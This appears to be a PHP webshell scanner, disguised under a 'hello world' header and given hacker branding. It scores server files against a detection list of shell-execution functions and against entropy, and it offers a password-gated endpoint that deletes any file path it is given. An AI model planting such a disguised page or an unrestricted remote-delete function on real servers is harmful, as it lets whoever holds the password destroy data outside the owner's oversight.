<?php
/**
 * hello world - MODERN SECURE VERSION
 */

session_start();
error_reporting(0);
ini_set('memory_limit', '-1');
set_time_limit(0);

$secure_hash = '$2y$10$kCqXIk.WWBwCtsW0CQPzmu1H/NpB4W0fnOLr0V19kUKP7DriZOgb6'; 

// AJAX Delete Logic
if (isset($_GET['ajax_delete']) && isset($_SESSION['logged_in'])) {
    $targetFile = base64_decode($_GET['ajax_delete']);
    if (file_exists($targetFile) && @unlink($targetFile)) { echo "success"; } else { echo "error"; }
    exit;
}

// LOGIN CHECK MENGGUNAKAN STANDAR MODERN
if (isset($_POST['pass']) && password_verify($_POST['pass'], $secure_hash)) { 
    $_SESSION['logged_in'] = true; 
}

if (isset($_GET['action']) && $_GET['action'] == 'logout') { session_destroy(); header("Location: ?"); exit; }

if (!isset($_SESSION['logged_in'])) {
?>
<!DOCTYPE html><html><head><title>Login</title><style>body{background:#0a0a0a;color:#00ff00;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;}.box{border:1px solid #00ff00;padding:30px;background:#111;text-align:center;}input{padding:10px;background:#000;border:1px solid #00ff00;color:#00ff00;margin-bottom:10px;}</style></head>
<body><div class="box"><h2>꧁⎝ 𓆩༺KECAUUU༻𓆪 ⎠꧂</h2><form method="post"><input type="password" name="pass" placeholder="Password" required><br><input type="submit" value="𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃"></form></div></body></html>
<?php exit; }

class UltimateScanner {
    private $ext = array('php','phtml','php3','php4','php5','php7','php8','suspected','inc','css');
    
    // Config deteksi
    private $criticalNeedles = array(
        'system' => 45, 'passthru' => 45, 'shell_exec' => 45, 'exec' => 45, 
        'move_uploaded_file' => 40, 'base64_decode' => 30, 'eval' => 50, 'assert' => 50,
        '$_FILES' => 30, '$_POST' => 5, '$_GET' => 5, 'glob' => 10, 'unlink' => 10
    );
    
    public function scan($dir) {
        $files = $this->recursiveScan($dir);
        $results = array();
        foreach ($files as $file) {
            $score = 0; $findings = array();
            $content = @file_get_contents($file);
            if (!$content) continue;
            
            $tokens = $this->getFileTokens($content);
            
            foreach ($this->criticalNeedles as $needle => $weight) {
                if (in_array(strtolower($needle), $tokens)) {
                    $score += $weight;
                    $findings[] = "Kritis: $needle";
                }
            }
            
            $entropy = $this->calculateEntropy($content);
            if($entropy > 5.8){ $score += 35; $findings[] = "High Entropy ($entropy)"; }
            
            // Fix regex pattern
            if(preg_match('/(\$[a-z0-9_]+)\s*\(\s*\$[a-z0-9_]+\s*\)/i', $content)){ $score += 40; $findings[] = "Dynamic Function Call"; }

            if ($score >= 15) {
                $results[] = array('file' => $file, 'score' => $score, 'findings' => $findings);
            }
        }
        usort($results, function($a, $b) { return $b['score'] - $a['score']; });
        return $results;
    }

    private function recursiveScan($dir) {
        $files = array(); $dir = rtrim($dir, DIRECTORY_SEPARATOR);
        $handle = @opendir($dir);
        if ($handle) {
            while (false !== ($file = readdir($handle))) {
                if ($file == '.' || $file == '..') continue;
                $path = $dir . DIRECTORY_SEPARATOR . $file;
                if (is_dir($path)) $files = array_merge($files, $this->recursiveScan($path));
                else if (in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $this->ext)) $files[] = $path;
            }
            closedir($handle);
        }
        return $files;
    }

    private function getFileTokens($content) {
        $tokens = @token_get_all($content);
        $out = array();
        foreach($tokens as $t) {
            if(is_array($t)) {
                $out[] = strtolower($t[1]);
            } else {
                $out[] = strtolower($t);
            }
        }
        return array_unique(array_filter($out));
    }

    private function calculateEntropy($data) {
        if(strlen($data) == 0) return 0;
        $freq = array_count_values(str_split($data)); $entropy = 0; $len = strlen($data);
        foreach($freq as $c) { $p = $c/$len; $entropy -= $p * log($p, 2); }
        return round($entropy, 2);
    }
}

$dir = isset($_POST['dir']) ? $_POST['dir'] : getcwd();
$scanner = new UltimateScanner();
$results = isset($_POST['submit']) ? $scanner->scan($dir) : array();
?>
<!DOCTYPE html>
<html>
<head>
    <title>Fusion Scanner Ultra</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
        .container { max-width: 1200px; margin: auto; background: #111; padding: 20px; border: 1px solid #333; }
        .header { display: flex; justify-content: space-between; margin-bottom: 20px; }
        input[type=text] { width: 70%; padding: 10px; background: #000; border: 1px solid #00ff00; color: #00ff00; }
        input[type=submit] { padding: 10px 20px; background: #00ff00; font-size: 14px; font-weight: bold; cursor: pointer; color:#000; border:none; }
        table { width: 100%; border-collapse: collapse; table-layout: fixed; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; font-size: 12px; word-wrap: break-word; }
        .btn-del { background: #ff4444; color: #000; padding: 5px; cursor: pointer; text-decoration: none; font-weight: bold; }
        .fade-out { opacity: 0; transition: opacity 0.5s; pointer-events: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h1>☣️ KECAUUU HERE!</h1><a href="?action=logout" style="color:#ff4444;">LOGOUT</a></div>
        <form method="post">
            <input type="text" name="dir" value="<?=htmlspecialchars($dir)?>">
            <input type="submit" name="submit" value="START DEEP SCAN">
        </form>
        
        <?php if($results): ?>
        <table>
            <thead><tr><th style="width:50px;">SC</th><th style="width:40%;">PATH</th><th>DETAILS</th><th style="width:80px;">ACT</th></tr></thead>
            <tbody>
                <?php foreach($results as $i => $res): ?>
                <tr id="row-<?=$i?>">
                    <td style="color:<?=($res['score']>60?'#f00':'#ff0')?>; font-weight:bold;"><?=$res['score']?></td>
                    <td><?=htmlspecialchars($res['file'])?></td>
                    <td><?=implode('<br>', $res['findings'])?></td>
                    <td><a href="javascript:void(0)" class="btn-del" onclick="deleteFile('<?=base64_encode($res['file'])?>', 'row-<?=$i?>')">DELETE</a></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        <?php endif; ?>
    </div>
    <script>
    function deleteFile(target, rowId) {
        if (!confirm('Hapus file ini permanen?')) return;
        const row = document.getElementById(rowId);
        fetch('?ajax_delete=' + target).then(r => r.text()).then(data => {
            if (data === 'success') { row.classList.add('fade-out'); setTimeout(() => row.remove(), 500); }
            else { alert('Gagal menghapus!'); }
        });
    }
    </script>
</body>
</html>